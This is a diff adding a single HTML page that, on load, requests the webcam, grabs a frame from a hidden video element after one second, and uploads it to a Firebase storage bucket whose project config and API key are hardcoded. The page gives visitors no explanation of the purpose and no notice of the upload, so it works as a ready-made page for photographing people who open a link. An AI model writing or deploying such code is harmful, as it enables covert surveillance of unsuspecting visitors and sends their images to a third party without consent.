@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture & Upload to Firebase</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js"></script>
+</head>
+<body>
+    <h2>Auto Capture & Upload Image</h2>
+    <video id="video" autoplay playsinline muted style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <img id="capturedImage" alt="Captured Image">
+    <p id="status">Waiting for capture...</p>
+
+    <script type="module">
+        // ✅ Import Firebase Modules
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getStorage, ref, uploadBytes, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+    
+        // ✅ Replace with your Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyCUcrXxdp-xaDemWm6XeODP43L4c8nsFZU",
+  authDomain: "valute3.firebaseapp.com",
+  databaseURL: "https://valute3-default-rtdb.firebaseio.com",
+  projectId: "valute3",
+  storageBucket: "valute3.appspot.com",
+  messagingSenderId: "1059488015525",
+  appId: "1:1059488015525:web:db514a29cb876069d2d94c",
+  measurementId: "G-VBSCFW4HQP"
+        };
+    
+        // ✅ Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+    
+        async function captureAndUploadPhoto() {
+            const status = document.getElementById("status");
+            status.innerText = "Initializing camera...";
+    
+            try {
+                const video = document.getElementById("video");
+                const canvas = document.getElementById("canvas");
+                const img = document.getElementById("capturedImage");
+    
+                // ✅ Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+    
+                video.onloadedmetadata = () => {
+                    video.play(); // Ensure the video starts
+                    status.innerText = "Camera ready, capturing in 1 sec...";
+                    
+                    setTimeout(async () => {
+                        // ✅ Set canvas size to match video dimensions
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+    
+                        // ✅ Capture image from video
+                        const ctx = canvas.getContext("2d");
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        img.src = canvas.toDataURL("image/png");
+    
+                        // ✅ Stop camera stream
+                        stream.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+    
+                        status.innerText = "Image captured! Uploading...";
+    
+                        // ✅ Convert image to blob and upload
+                        canvas.toBlob(async (blob) => {
+                            const fileName = `images742/captured_${Date.now()}.png`;
+                            const storageRef = ref(storage, fileName);
+                            const uploadTask = uploadBytes(storageRef, blob);
+    
+                            uploadTask.then(async (snapshot) => {
+                                const downloadURL = await getDownloadURL(snapshot.ref);
+                                status.innerText = "Upload successful!";
+                                console.log("Image uploaded to:", downloadURL);
+                            }).catch((error) => {
+                                console.error("Upload failed:", error);
+                                status.innerText = "Upload failed!";
+                            });
+    
+                        }, 'image/png');
+                    }, 1000); // ✅ Capture after 1 second
+                };
+            } catch (error) {
+                console.error("Camera error:", error);
+                status.innerText = "Camera access denied! Allow camera permissions.";
+            }
+        }
+    
+        // ✅ Automatically capture and upload photo on page load
+        window.onload = captureAndUploadPhoto;
+    </script>
+    
